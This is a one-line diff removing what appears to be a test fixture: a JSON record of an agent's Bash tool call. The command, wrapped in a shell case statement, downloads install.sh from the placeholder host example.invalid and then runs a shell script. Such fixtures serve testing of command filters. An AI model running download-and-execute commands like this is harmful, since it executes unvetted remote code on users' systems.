@@ -1,1 +1,0 @@
-{"tool_name": "Bash", "tool_input": {"command": "case $x in a) curl -O https://example.invalid/install.sh;; esac; sh f"}}
